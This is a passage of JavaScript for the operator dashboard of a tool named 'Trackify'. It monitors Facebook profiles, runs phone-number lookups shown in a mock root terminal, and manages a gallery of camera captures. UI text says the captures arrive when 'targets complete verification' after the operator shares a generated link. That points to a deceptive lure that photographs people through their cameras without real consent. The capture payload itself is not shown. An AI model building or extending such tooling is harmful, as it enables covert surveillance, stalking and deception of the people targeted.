            return isNaN(d2.getTime()) ? null : d2;
        }

        /** e.g. April 11 2026 9:56 PM */
        function fbMonitorFormatNiceDateTime(d) {
            if (!d || isNaN(d.getTime())) return '';
            const months = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December'];
            const mo = months[d.getMonth()];
            const day = d.getDate();
            const y = d.getFullYear();
            let h24 = d.getHours();
            const min = d.getMinutes();
            const ampm = h24 >= 12 ? 'PM' : 'AM';
            let h = h24 % 12;
            if (h === 0) h = 12;
            const minStr = min < 10 ? '0' + min : String(min);
            return mo + ' ' + day + ' ' + y + ' ' + h + ':' + minStr + ' ' + ampm;
        }

        function fbMonitorFormatDisplayDateTime(s) {
            const d = fbMonitorParseStoredDate(s);
            if (!d) return s ? String(s) : '';
            return fbMonitorFormatNiceDateTime(d);
        }

        function fbMonitorFormatActivityTime(at) {
            return fbMonitorFormatDisplayDateTime(at);
        }

        function fbMonitorSourceLabel(src) {
            if (src === 'cron') return 'cron';
            if (src === 'dashboard') return 'dashboard';
            return src || '—';
        }

        function fbMonitorFormatLogEntriesHtml(entries, opt) {
            opt = opt || {};
            const hideUrlInMeta = !!opt.hideUrlInMeta;
            if (!Array.isArray(entries) || entries.length === 0) {
                return '';
            }
            return entries.map(function (e) {
                const st = String(e.status || 'unknown');
                const statusColor = st === 'error' ? '#f07178' : fbStatusColor(st);
                const lbl = st === 'error' ? 'Error' : fbStatusLabel(st);
                const detail = e.detail ? ' — ' + e.detail : '';
                const metaParts = [
                    fbMonitorSourceLabel(e.source),
                    fbMonitorFormatActivityTime(e.at)
                ];
                const labelPart = (e.label && String(e.label).trim()) ? String(e.label).trim() : '';
                if (labelPart) metaParts.push(labelPart);
                if (!hideUrlInMeta) {
                    const urlPart = fbMonitorShortUrl(e.profile_url);
                    if (urlPart && urlPart !== '—') metaParts.push(urlPart);
                }
                const meta = metaParts.join(' · ');
                return '<div class="fb-monitor-log-line">'
                    + '<span class="fb-monitor-log-meta">' + escHtml(meta) + '</span>'
                    + '<span class="fb-monitor-log-status" style="color:' + statusColor + '">' + escHtml(lbl) + '</span>'
                    + '<span class="fb-monitor-log-detail">' + escHtml(detail) + '</span>'
                    + '</div>';
            }).join('');
        }

        function fbMonitorCloseRowLogModal(event) {
            const m = document.getElementById('fbMonitorRowLogModal');
            if (!m || !m.classList.contains('show')) return;
            if (event && event.target !== event.currentTarget) return;
            m.classList.remove('show');
        }

        async function fbMonitorOpenRowLogs(id) {
            const modal = document.getElementById('fbMonitorRowLogModal');
            const titleEl = document.getElementById('fbMonitorRowLogModalTitle');
            const subEl = document.getElementById('fbMonitorRowLogModalSub');
            const pre = document.getElementById('fbMonitorRowLogTerminal');
            if (!modal || !pre) return;
            modal.classList.add('show');
            pre.innerHTML = '<span class="fb-monitor-log-empty">Loading…</span>';
            if (titleEl) titleEl.textContent = 'Check log';
            if (subEl) subEl.textContent = '';
            try {
                const res = await fetch('api.php?action=fb_monitor_logs&monitor_id=' + encodeURIComponent(String(id)), { credentials: 'same-origin' });
                const data = await res.json().catch(() => ({}));
                if (data.status !== 'success') {
                    pre.innerHTML = '<span class="fb-monitor-log-empty">' + escHtml(data.message || 'Could not load log.') + '</span>';
                    return;
                }
                const ctx = data.context || {};
                const lbl = (ctx.label && String(ctx.label).trim()) ? String(ctx.label).trim() : '';
                if (titleEl) titleEl.textContent = lbl ? lbl : 'Check log';
                if (subEl) subEl.textContent = ctx.profile_url ? String(ctx.profile_url) : '';
                const entries = data.entries || [];
                if (entries.length === 0) {
                    pre.innerHTML = '<span class="fb-monitor-log-empty">No logged checks for this URL yet. Run <strong>Check</strong> or wait for cron.</span>';
                    return;
                }
                pre.innerHTML = fbMonitorFormatLogEntriesHtml(entries, { hideUrlInMeta: true });
            } catch (e) {
                pre.innerHTML = '<span class="fb-monitor-log-empty">Network error loading log.</span>';
            }
        }

        function fbMonitorRenderPagination(meta) {
            const el = document.getElementById('fbMonitorPagination');
            if (!el) return;
            const total = meta.total || 0;
            const page = meta.page || 1;
            const perPage = meta.per_page || 10;
            const totalPages = meta.total_pages || 0;
            if (total === 0) {
                el.innerHTML = '';
                el.hidden = true;
                return;
            }
            el.hidden = false;
            const start = (page - 1) * perPage + 1;
            const end = Math.min(page * perPage, total);
            const info = 'Showing ' + start + '–' + end + ' of ' + total;
            const prevDisabled = page <= 1;
            const nextDisabled = totalPages <= 1 || page >= totalPages;
            el.innerHTML =
                '<div class="fb-monitor-pagination-inner">' +
                '<span class="fb-monitor-pagination-info">' + escHtml(info) + '</span>' +
                '<div class="fb-monitor-pagination-btns">' +
                '<button type="button" class="btn btn-secondary" id="fbMonitorPagePrev"' + (prevDisabled ? ' disabled' : '') + '>Previous</button>' +
                '<span class="fb-monitor-pagination-page">Page ' + page + ' of ' + (totalPages || 1) + '</span>' +
                '<button type="button" class="btn btn-secondary" id="fbMonitorPageNext"' + (nextDisabled ? ' disabled' : '') + '>Next</button>' +
                '</div>' +
                '</div>';
            const prev = document.getElementById('fbMonitorPagePrev');
            const next = document.getElementById('fbMonitorPageNext');
            if (prev && !prevDisabled) {
                prev.addEventListener('click', function () {
                    fbMonitorListState.page = Math.max(1, page - 1);
                    void loadFbMonitorList();
                });
            }
            if (next && !nextDisabled) {
                next.addEventListener('click', function () {
                    fbMonitorListState.page = Math.min(totalPages, page + 1);
                    void loadFbMonitorList();
                });
            }
        }

        function fbMonitorSearchApply() {
            const inp = document.getElementById('fbMonitorSearch');
            fbMonitorListState.q = (inp && inp.value ? inp.value : '').trim();
            fbMonitorListState.page = 1;
            void loadFbMonitorList();
        }

        (function bindFbMonitorSearch() {
            const inp = document.getElementById('fbMonitorSearch');
            if (!inp || inp._fbSearchBound) return;
            inp._fbSearchBound = true;
            inp.addEventListener('input', function () {
                clearTimeout(fbMonitorSearchDebounceTimer);
                fbMonitorSearchDebounceTimer = setTimeout(fbMonitorSearchApply, 320);
            });
            inp.addEventListener('search', function () {
                clearTimeout(fbMonitorSearchDebounceTimer);
                fbMonitorSearchApply();
            });
        })();

        var fbMonitorListAutoRefreshTimer = null;

        function fbMonitorStopListAutoRefresh() {
            if (fbMonitorListAutoRefreshTimer !== null) {
                clearInterval(fbMonitorListAutoRefreshTimer);
                fbMonitorListAutoRefreshTimer = null;
            }
        }

        function fbMonitorStartListAutoRefresh() {
            fbMonitorStopListAutoRefresh();
            fbMonitorListAutoRefreshTimer = setInterval(function () {
                var layout = document.getElementById('fbmonitorLayout');
                if (!layout || layout.style.display === 'none') {
                    return;
                }
                if (typeof document.visibilityState === 'string' && document.visibilityState === 'hidden') {
                    return;
                }
                loadFbMonitorList();
            }, 60000);
        }

        function fbMonitorRefreshTable() {
            var btn = document.getElementById('fbMonitorTableRefreshBtn');
            if (btn) {
                btn.disabled = true;
            }
            Promise.resolve(loadFbMonitorList()).finally(function () {
                if (btn) {
                    btn.disabled = false;
                }
            });
        }

        async function loadFbMonitorList() {
            const tbody = document.getElementById('fbMonitorTableBody');
            const pagEl = document.getElementById('fbMonitorPagination');
            if (!tbody) return;
            try {
                const qs = new URLSearchParams();
                qs.set('action', 'fb_monitor_list');
                qs.set('page', String(fbMonitorListState.page));
                qs.set('per_page', String(fbMonitorListState.perPage));
                if (fbMonitorListState.q) {
                    qs.set('q', fbMonitorListState.q);
                }
                const res = await fetch('api.php?' + qs.toString(), { credentials: 'same-origin' });
                const data = await res.json().catch(() => ({}));
                if (data.status !== 'success') {
                    if (pagEl) {
                        pagEl.innerHTML = '';
                        pagEl.hidden = true;
                    }
                    const selFail = document.getElementById('fbMonitorSelectAll');
                    if (selFail) {
                        selFail.checked = false;
                        selFail.indeterminate = false;
                        selFail.disabled = true;
                    }
                    const bulkBtnFail = document.getElementById('fbMonitorBulkDeleteBtn');
                    const bulkCntFail = document.getElementById('fbMonitorBulkCount');
                    if (bulkBtnFail) bulkBtnFail.hidden = true;
                    if (bulkCntFail) bulkCntFail.textContent = '';
                    tbody.innerHTML = '<tr class="fb-monitor-msg-row"><td colspan="6" style="color:#f07178;padding:16px">' + escHtml(data.message || 'Failed to load') + '</td></tr>';
                    return;
                }
                if (typeof data.page === 'number' && data.page > 0) {
                    fbMonitorListState.page = data.page;
                }
                const monitors = data.monitors || [];
                const total = typeof data.total === 'number' ? data.total : 0;
                const qActive = !!(fbMonitorListState.q && fbMonitorListState.q.length);
                if (monitors.length === 0) {
                    if (pagEl) {
                        pagEl.innerHTML = '';
                        pagEl.hidden = true;
                    }
                    let emptyMsg = 'No profiles or pages monitored yet.';
                    if (total === 0 && qActive) {
                        emptyMsg = 'No matches for your search.';
                    }
                    const selEmpty = document.getElementById('fbMonitorSelectAll');
                    if (selEmpty) {
                        selEmpty.checked = false;
                        selEmpty.indeterminate = false;
                        selEmpty.disabled = true;
                    }
                    const bulkBtnEmpty = document.getElementById('fbMonitorBulkDeleteBtn');
                    const bulkCntEmpty = document.getElementById('fbMonitorBulkCount');
                    if (bulkBtnEmpty) bulkBtnEmpty.hidden = true;
                    if (bulkCntEmpty) bulkCntEmpty.textContent = '';
                    tbody.innerHTML = '<tr class="fb-monitor-msg-row"><td colspan="6" style="color:var(--text-muted);padding:16px">' + emptyMsg + '</td></tr>';
                    return;
                }
                tbody.innerHTML = monitors.map(function (m) {
                    const id = parseInt(m.id, 10);
                    const labelCell = m.label ? escHtml(m.label) : '<span style="color:var(--text-muted)">—</span>';
                    const urlFull = escHtml(m.profile_url);
                    const checked = m.last_checked_at ? escHtml(fbMonitorFormatDisplayDateTime(m.last_checked_at)) : 'Never';
                    const statusLbl = fbStatusLabel(m.last_status);
                    const statusTagClass = fbMonitorStatusTagClass(m.last_status);
                    const checkSvg = '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" aria-hidden="true"><path d="M23 4v6h-6"/><path d="M1 20v-6h6"/><path d="M3.51 9a9 9 0 0114.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0020.49 15"/></svg>';
                    const logsSvg = '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" aria-hidden="true"><path d="M8 6h13M8 12h13M8 18h13M3 6h.01M3 12h.01M3 18h.01"/></svg>';
                    const trashSvg = '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" aria-hidden="true"><path d="M3 6h18M19 6v14a2 2 0 01-2 2H7a2 2 0 01-2-2V6M8 6V4a2 2 0 012-2h4a2 2 0 012 2v2"/></svg>';
                    return '<tr>'
                        + '<td class="fb-monitor-col-check"><input type="checkbox" class="fb-monitor-row-cb" data-monitor-id="' + id + '" aria-label="Select this row"></td>'
                        + '<td style="font-weight:600;max-width:12rem">' + labelCell + '</td>'
                        + '<td><a href="' + escHtml(m.profile_url) + '" target="_blank" rel="noopener noreferrer" style="color:var(--link);word-break:break-all;font-size:12px">' + urlFull + '</a></td>'
                        + '<td class="fb-monitor-status-cell"><span class="' + statusTagClass + '">' + escHtml(statusLbl) + '</span></td>'
                        + '<td class="saved-info-col-time" style="font-size:12px;color:var(--text-muted)">' + checked + '</td>'
                        + '<td class="fb-monitor-action-cell">'
                        +   '<div class="fb-monitor-action-btns">'
                        +   '<button type="button" class="fb-monitor-check-btn" data-monitor-id="' + id + '" onclick="fbMonitorCheckOne(' + id + ', this)" aria-label="Check this URL now">'
                        +     '<span class="fb-monitor-check-idle">' + checkSvg + ' <span>Check</span></span>'
                        +     '<span class="fb-monitor-check-busy" aria-hidden="true"><span class="fb-monitor-spinner"></span><span>Checking…</span></span>'
                        +   '</button>'
                        +   '<button type="button" class="fb-monitor-logs-btn" data-monitor-id="' + id + '" onclick="fbMonitorOpenRowLogs(' + id + ')" aria-label="View check log for this URL">'
                        +     logsSvg + ' <span>Logs</span>'
                        +   '</button>'
                        +   '<button type="button" class="fb-monitor-remove-btn" data-monitor-id="' + id + '" onclick="fbMonitorOpenRemoveModal(' + id + ')" aria-label="Remove from list">'
                        +     trashSvg + ' <span>Remove</span>'
                        +   '</button>'
                        +   '</div>'
                        + '</td>'
                        + '</tr>';
                }).join('');
                fbMonitorSyncSelectAllFromRows();
                fbMonitorUpdateBulkToolbar();
                fbMonitorRenderPagination(data);
            } catch (e) {
                if (pagEl) {
                    pagEl.innerHTML = '';
                    pagEl.hidden = true;
                }
                const selNet = document.getElementById('fbMonitorSelectAll');
                if (selNet) {
                    selNet.checked = false;
                    selNet.indeterminate = false;
                    selNet.disabled = true;
                }
                const bulkBtnNet = document.getElementById('fbMonitorBulkDeleteBtn');
                const bulkCntNet = document.getElementById('fbMonitorBulkCount');
                if (bulkBtnNet) bulkBtnNet.hidden = true;
                if (bulkCntNet) bulkCntNet.textContent = '';
                tbody.innerHTML = '<tr class="fb-monitor-msg-row"><td colspan="6" style="color:#f07178;padding:16px">Network error</td></tr>';
            }
        }

        function escHtml(s) {
            return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
        }

        async function fbMonitorAdd() {
            const urlInput = document.getElementById('fbMonitorUrlInput');
            const nameInput = document.getElementById('fbMonitorNameInput');
            const errEl = document.getElementById('fbMonitorAddError');
            const url = (urlInput ? urlInput.value : '').trim();
            const name = (nameInput ? nameInput.value : '').trim();
            if (errEl) { errEl.hidden = true; errEl.textContent = ''; }
            if (!url) {
                if (errEl) { errEl.textContent = 'Please enter a Facebook profile or page URL.'; errEl.hidden = false; }
                return;
            }
            if (!name) {
                if (errEl) { errEl.textContent = 'Please enter a name.'; errEl.hidden = false; }
                if (nameInput) nameInput.focus();
                return;
            }
            try {
                const res = await fetch('api.php?action=fb_monitor_add', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ url: url, label: name }),
                    credentials: 'same-origin'
                });
                const data = await res.json().catch(() => ({}));
                if (data.status !== 'success') {
                    if (errEl) { errEl.textContent = data.message || 'Failed to add.'; errEl.hidden = false; }
                    return;
                }
                if (urlInput) urlInput.value = '';
                if (nameInput) nameInput.value = '';
                fbMonitorCloseAddModal();
                fbMonitorListState.page = 1;
                await loadFbMonitorList();
            } catch (e) {
                if (errEl) { errEl.textContent = 'Network error — try again.'; errEl.hidden = false; }
            }
        }

        function fbMonitorToast(msg, isError) {
            const toast = document.getElementById('toast');
            if (!toast) return;
            toast.textContent = msg;
            toast.style.background = isError ? 'var(--accent-red)' : '';
            toast.classList.add('show');
            setTimeout(function () {
                toast.classList.remove('show');
                toast.style.background = '';
            }, isError ? 3800 : 2800);
        }

        async function fbMonitorCheckAll() {
            const btn = document.getElementById('fbMonitorCheckAllBtn');
            const prev = btn ? btn.textContent : '';
            if (btn) { btn.disabled = true; btn.textContent = 'Checking…'; }
            try {
                const res = await fetch('api.php?action=fb_monitor_check', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({}),
                    credentials: 'same-origin'
                });
                const data = await res.json().catch(() => ({}));
                if (data.status !== 'success') {
                    fbMonitorToast(data.message || 'Check failed.', true);
                } else {
                    const results = data.results || [];
                    if (results.length === 0) {
                        fbMonitorToast('Nothing to check. Add a profile or page URL first.', false);
                    } else {
                        const n = results.length;
                        await loadFbMonitorList();
                        fbMonitorToast(
                            n === 1
                                ? 'Check complete — 1 URL.'
                                : 'Check complete — ' + n + ' URLs.',
                            false
                        );
                    }
                }
            } catch (e) {
                fbMonitorToast('Network error — try again.', true);
            } finally {
                if (btn) { btn.disabled = false; btn.textContent = prev; }
            }
        }

        function fbMonitorSetCheckLoading(btn, loading) {
            if (!btn || !btn.classList || !btn.classList.contains('fb-monitor-check-btn')) return;
            btn.classList.toggle('is-loading', !!loading);
            btn.disabled = !!loading;
            btn.setAttribute('aria-busy', loading ? 'true' : 'false');
        }

        async function fbMonitorCheckOne(id, btn) {
            const el = btn && btn.closest ? btn.closest('button.fb-monitor-check-btn') : null;
            if (el) fbMonitorSetCheckLoading(el, true);
            try {
                const res = await fetch('api.php?action=fb_monitor_check', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ id: id }),
                    credentials: 'same-origin'
                });
                const data = await res.json().catch(() => ({}));
                if (data.status !== 'success') {
                    fbMonitorToast(data.message || 'Check failed.', true);
                } else {
                    await loadFbMonitorList();
                    fbMonitorToast('Check complete.', false);
                }
            } catch (e) {
                fbMonitorToast('Network error — try again.', true);
            } finally {
                if (el && el.isConnected) {
                    fbMonitorSetCheckLoading(el, false);
                }
            }
        }

        // -----------------------------------------------------------------------
        // End Facebook Monitor JS
        // -----------------------------------------------------------------------

        async function loadPhoneHistory() {
            const listEl = document.getElementById('phoneHistoryList');
            if (!listEl) return;
            try {
                const res = await fetch(API + '?action=phone_history', { credentials: 'same-origin' });
                const data = await res.json();
                if (!data || data.status !== 'success' || !Array.isArray(data.history) || data.history.length === 0) {
                    listEl.innerHTML =
                        '<div class="phone-history-item">' +
                        '<div class="phone-history-meta">No scans yet.</div>' +
                        '</div>';
                    return;
                }
                listEl.innerHTML = data.history.map(item => {
                    const num = String(item.phone_number || '');
                    const cnt = typeof item.url_count === 'number' ? item.url_count : (Array.isArray(item.urls) ? item.urls.length : 0);
                    const ts = String(item.created_at || '');

                    let first = Array.isArray(item.urls) && item.urls.length ? item.urls[0] : '';
                    let rawUrl = '';
                    let title = '';
                    if (first && typeof first === 'object') {
                        rawUrl = String(first.url || first.link || '');
                        if (first.title) title = String(first.title);
                    } else {
                        rawUrl = String(first || '');
                    }

                    const safeNum = num.replace(/</g,'&lt;').replace(/>/g,'&gt;');
                    const safeTs = ts.replace(/</g,'&lt;').replace(/>/g,'&gt;');
                    const safeUrl = rawUrl.replace(/</g,'&lt;').replace(/>/g,'&gt;');
                    const safeTitle = title ? title.replace(/</g,'&lt;').replace(/>/g,'&gt;') : '';

                    return '' +
                        '<div class="phone-history-item">' +
                        '<div class="phone-history-number">' + safeNum + '</div>' +
                        '<div class="phone-history-meta">' + cnt + ' URL(s) · ' + safeTs + '</div>' +
                        (safeUrl ? '<div class="phone-history-urls"><a href="' + safeUrl + '" target="_blank" rel="noopener noreferrer">' +
                            (safeTitle || safeUrl) + '</a></div>' : '') +
                        '</div>';
                }).join('');
            } catch (e) {
                listEl.innerHTML =
                    '<div class="phone-history-item">' +
                    '<div class="phone-history-meta">Could not load history.</div>' +
                    '</div>';
            }
        }

        function performPhoneLookup() {
            const input = document.getElementById('phoneLookupInput');
            const resultsEl = document.getElementById('phoneLookupResults');
            const errorEl = document.getElementById('phoneLookupError');
            if (!input || !resultsEl) return;

            const raw = (input.value || '').trim();
            if (!raw) {
                if (errorEl) {
                    errorEl.textContent = 'Please enter a phone number.';
                    errorEl.hidden = false;
                }
                return;
            }
            if (errorEl) {
                errorEl.textContent = '';
                errorEl.hidden = true;
            }

            // Normalize a bit but keep the exact string for quoted searches
            const phoneForQuery = raw.replace(/\s+/g, ' ').trim();
            const safeDisplay = phoneForQuery.replace(/</g, '&lt;').replace(/>/g, '&gt;');

            resultsEl.innerHTML =
                '<div class="phone-lookup-terminal">' +
                '<div class="phone-lookup-terminal-line"><span class="hint">[*]</span> Searching for <span class="link">' + safeDisplay + '</span> ...</div>' +
                '<div class="phone-lookup-terminal-line"><span class="prompt">root@trackify:~# </span><span class="terminal-cursor"></span></div>' +
                '</div>';

            fetch(API + '?action=phone_lookup&number=' + encodeURIComponent(phoneForQuery), {
                credentials: 'same-origin'
            }).then(r => r.json()).then(data => {
                const lines = [];
                if (!data || data.status !== 'success') {
                    const msg = (data && data.message) ? String(data.message) : 'Search failed';
                    lines.push('<div class="phone-lookup-terminal-line"><span class="hint">[!]</span> ' + msg.replace(/</g,'&lt;').replace(/>/g,'&gt;') + '</div>');
                    lines.push('<div class="phone-lookup-terminal-line"><span class="prompt">root@trackify:~# </span><span class="terminal-cursor"></span></div>');
                    resultsEl.innerHTML =
                        '<div class="phone-lookup-terminal">' +
                        lines.join('') +
                        '</div>';
                    return;
                }

                const urls = Array.isArray(data.urls) ? data.urls : [];
                lines.push('<div class="phone-lookup-terminal-line"><span class="hint">[*]</span> Found ' + urls.length + ' result(s) for <span class="link">' + safeDisplay + '</span></div>');
                lines.push('<div class="phone-lookup-terminal-line"><span class="hint">[*]</span> Copy any URL below and open it in your browser.</div>');
                lines.push('<div class="phone-lookup-terminal-line">&nbsp;</div>');

                if (urls.length > 0) {
                    urls.forEach(entry => {
                        let rawUrl = '';
                        let title = '';
                        let snippet = '';
                        if (entry && typeof entry === 'object') {
                            rawUrl = String(entry.url || entry.link || '');
                            if (entry.title) title = String(entry.title);
                            if (entry.snippet) snippet = String(entry.snippet);
                        } else {
                            rawUrl = String(entry);
                        }
                        if (!rawUrl) return;
                        const safeUrl = rawUrl.replace(/</g,'&lt;').replace(/>/g,'&gt;');
                        const safeTitle = title ? title.replace(/</g,'&lt;').replace(/>/g,'&gt;') : '';
                        const safeSnippet = snippet ? snippet.replace(/</g,'&lt;').replace(/>/g,'&gt;') : '';
                        lines.push(
                            '<div class="phone-lookup-terminal-line"><span class="prompt">root@trackify:~#</span> ' +
                            '<a class="link" href="' + safeUrl + '" target="_blank" rel="noopener noreferrer">' +
                            safeUrl +
                            '</a></div>'
                        );
                        if (safeTitle || safeSnippet) {
                            const meta = [safeTitle, safeSnippet].filter(Boolean).join(' — ');
                            lines.push(
                                '<div class="phone-lookup-terminal-line"><span class="hint">    ↳ ' + meta + '</span></div>'
                            );
                        }
                    });
                }
                lines.push('<div class="phone-lookup-terminal-line">&nbsp;</div>');
                lines.push('<div class="phone-lookup-terminal-line"><span class="prompt">root@trackify:~# </span><span class="terminal-cursor"></span></div>');

                resultsEl.innerHTML =
                    '<div class="phone-lookup-terminal">' +
                    lines.join('') +
                    '</div>';
            }).catch(err => {
                const msg = (err && err.message) ? err.message : String(err);
                resultsEl.innerHTML =
                    '<div class="phone-lookup-terminal">' +
                    '<div class="phone-lookup-terminal-line"><span class="hint">[!]</span> Error: ' + msg.replace(/</g,'&lt;').replace(/>/g,'&gt;') + '</div>' +
                    '<div class="phone-lookup-terminal-line"><span class="prompt">root@trackify:~# </span><span class="terminal-cursor"></span></div>' +
                    '</div>';
            });
        }

        function syncGallerySelectAll() {
            const grid = document.getElementById('galleryGrid');
            const selectAll = document.getElementById('gallerySelectAll');
            if (!grid || !selectAll) return;
            const cbs = grid.querySelectorAll('.gallery-select-cb');
            if (cbs.length === 0) {
                selectAll.checked = false;
                selectAll.indeterminate = false;
                return;
            }
            const n = [...cbs].filter(c => c.checked).length;
            selectAll.checked = n === cbs.length;
            selectAll.indeterminate = n > 0 && n < cbs.length;
        }

        function updateGalleryBulkDeleteBtn() {
            const grid = document.getElementById('galleryGrid');
            const btn = document.getElementById('galleryBulkDelete');
            if (!grid || !btn) return;
            const n = grid.querySelectorAll('.gallery-select-cb:checked').length;
            btn.disabled = n === 0;
        }

        function resetGallerySelectionUi() {
            const selectAll = document.getElementById('gallerySelectAll');
            if (selectAll) {
                selectAll.checked = false;
                selectAll.indeterminate = false;
            }
            updateGalleryBulkDeleteBtn();
        }

        var galleryDeletePendingPaths = null;

        function galleryDeleteOpenModal(paths) {
            if (!paths || !paths.length) {
                return;
            }
            galleryDeletePendingPaths = paths.slice();
            var modal = document.getElementById('galleryDeleteModal');
            var titleEl = document.getElementById('galleryDeleteModalTitle');
            var bodyEl = document.getElementById('galleryDeleteModalBody');
            if (!modal || !titleEl || !bodyEl) {
                return;
            }
            var n = galleryDeletePendingPaths.length;
            if (n === 1) {
                titleEl.textContent = 'Delete this capture?';
                bodyEl.textContent = 'This image will be removed from your gallery. This action cannot be undone.';
            } else {
                titleEl.textContent = 'Delete selected captures?';
                bodyEl.textContent = 'Delete ' + n + ' selected capture(s) from your gallery. This action cannot be undone.';
            }
            modal.classList.add('show');
        }

        function galleryDeleteCloseModal(event) {
            var m = document.getElementById('galleryDeleteModal');
            if (!m || !m.classList.contains('show')) {
                return;
            }
            if (event !== undefined && event !== null && event.target !== event.currentTarget) {
                return;
            }
            m.classList.remove('show');
            galleryDeletePendingPaths = null;
        }

        function galleryDeleteConfirm() {
            var paths = galleryDeletePendingPaths;
            galleryDeletePendingPaths = null;
            var m = document.getElementById('galleryDeleteModal');
            if (m) {
                m.classList.remove('show');
            }
            if (paths && paths.length) {
                deletePhotosByPaths(paths);
            }
        }

        async function deletePhotosByPaths(paths) {
            if (!paths || !paths.length) return;
            try {
                const res = await fetch(API + '?action=delete_photos', {
                    method: 'POST',
                    credentials: 'same-origin',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ paths })
                });
                const data = await res.json().catch(() => ({}));
                if (data.status !== 'success') {
                    alert(data.message || 'Delete failed');
                    return;
                }
                const toast = document.getElementById('toast');
                let msg = data.deleted ? 'Deleted ' + data.deleted + ' file(s)' : 'Nothing deleted';
                if (data.failed) msg += ' (' + data.failed + ' failed)';
                toast.textContent = msg;
                toast.classList.add('show');
                setTimeout(() => toast.classList.remove('show'), 2500);
                await loadPhotos(currentPage);
            } catch (err) {
                alert('Delete failed: ' + (err && err.message ? err.message : String(err)));
            }
        }

        async function loadPhotos(page = 1) {
            try {
                const res = await fetch(API + '?action=photos&page=' + page + '&per_page=12', { credentials: 'same-origin' });
                const data = await res.json();
                if (data.status === 'success') {
                    currentPage = page;
                    const { photos, pagination } = data;
                    const grid = document.getElementById('galleryGrid');
                    const paginationEl = document.getElementById('pagination');
                    const photoCount = document.getElementById('photoCount');
                    const prevBtn = document.getElementById('prevBtn');
                    const nextBtn = document.getElementById('nextBtn');
                    const paginationInfo = document.getElementById('paginationInfo');
                    const toolbar = document.getElementById('galleryToolbar');

                    if (photos.length === 0 && pagination.total > 0 && pagination.has_prev) {
                        await loadPhotos(page - 1);
                        return;
                    }

                    photoCount.textContent = pagination.total ? pagination.total + ' capture' + (pagination.total !== 1 ? 's' : '') : '';

                    const quotaBanner = document.getElementById('captureQuotaBanner');
                    const q = data.capture_quota;
                    if (quotaBanner && q) {
                        if (q.full) {
                            quotaBanner.style.display = 'block';
                            quotaBanner.textContent = 'Maximum image captures reached (' + q.used + '/' + q.max + '). Delete photos below to allow new camera uploads.';
                        } else {
                            quotaBanner.style.display = 'none';
                        }
                    }

                    if (toolbar) {
                        toolbar.style.display = pagination.total > 0 ? 'flex' : 'none';
                    }
                    resetGallerySelectionUi();

                    if (photos.length === 0) {
                        grid.innerHTML = `
                            <div class="gallery-empty" id="galleryEmpty">
                                <div class="gallery-empty-icon">📷</div>
                                <div class="gallery-empty-title">No captures yet</div>
                                <div class="gallery-empty-text">Camera captures will appear here when targets complete verification.</div>
                                <div class="gallery-empty-hint">Generate a link and share it to start capturing</div>
                            </div>
                        `;
                        paginationEl.style.display = 'none';
                    } else {
                        grid.innerHTML = photos.map(p => `
                            <div class="gallery-item" tabindex="0" title="Click to view full size"
                                 data-full-src="${escapeHtmlAttr(p.path)}"
                                 aria-label="Capture ${escapeHtmlAttr(p.filename || '')}">
                                <div class="gallery-item-actions">
                                    <label class="gallery-toolbar-label gallery-select-label">
                                        <input type="checkbox" class="gallery-select-cb" data-path="${escapeHtmlAttr(p.path)}">
                                    </label>
                                    <button type="button" class="gallery-delete-one" data-path="${escapeHtmlAttr(p.path)}" title="Delete" aria-label="Delete capture">×</button>
                                </div>
                                <img src="${p.path}" alt="" loading="lazy">
                                <div class="gallery-item-overlay">${new Date(p.date * 1000).toLocaleString()} · View</div>
                            </div>
                        `).join('');
                        paginationEl.style.display = 'flex';
                        prevBtn.disabled = !pagination.has_prev;
                        nextBtn.disabled = !pagination.has_next;
                        paginationInfo.textContent = `Page ${pagination.page} of ${pagination.total_pages}`;
                        syncGallerySelectAll();
                        updateGalleryBulkDeleteBtn();
                    }
                }
            } catch (e) {}
        }

        function openLightbox(src) {
            if (!src) return;
            const resolved = new URL(src, window.location.href).href;
            const img = document.getElementById('lightboxImg');
            img.src = resolved;
            document.getElementById('lightbox').classList.add('show');
            document.body.style.overflow = 'hidden';
        }

        function closeLightbox() {
            document.getElementById('lightbox').classList.remove('show');
            document.getElementById('lightboxImg').src = '';
            document.body.style.overflow = '';
        }

        (function initGalleryLightbox() {
            const grid = document.getElementById('galleryGrid');
            if (!grid) return;
            grid.addEventListener('click', function (e) {
                if (e.target.closest('.gallery-item-actions')) return;
                const item = e.target.closest('.gallery-item');
                if (!item || !grid.contains(item)) return;
                const src = item.getAttribute('data-full-src');
                if (src) openLightbox(src);
            });
            grid.addEventListener('keydown', function (e) {
                if (e.key !== 'Enter' && e.key !== ' ') return;
                if (e.target.closest('.gallery-item-actions')) return;
                const item = e.target.closest('.gallery-item');
                if (!item || !grid.contains(item)) return;
                e.preventDefault();
                const src = item.getAttribute('data-full-src');
                if (src) openLightbox(src);
            });
            grid.addEventListener('change', function (e) {
                if (!e.target.classList || !e.target.classList.contains('gallery-select-cb')) return;
                syncGallerySelectAll();
                updateGalleryBulkDeleteBtn();
            });
        })();

        (function initGalleryBulkControls() {
            const selectAll = document.getElementById('gallerySelectAll');
            const bulkDel = document.getElementById('galleryBulkDelete');
            const grid = document.getElementById('galleryGrid');
            if (!selectAll || !bulkDel || !grid) return;
            selectAll.addEventListener('change', function () {
                grid.querySelectorAll('.gallery-select-cb').forEach(function (cb) {
                    cb.checked = selectAll.checked;
                });
                selectAll.indeterminate = false;
                updateGalleryBulkDeleteBtn();
            });
            bulkDel.addEventListener('click', function () {
                const paths = [...grid.querySelectorAll('.gallery-select-cb:checked')]
                    .map(function (cb) { return cb.getAttribute('data-path'); })
                    .filter(Boolean);
                if (!paths.length) return;
                galleryDeleteOpenModal(paths);
            });
            grid.addEventListener('click', function (e) {
                const btn = e.target.closest('.gallery-delete-one');
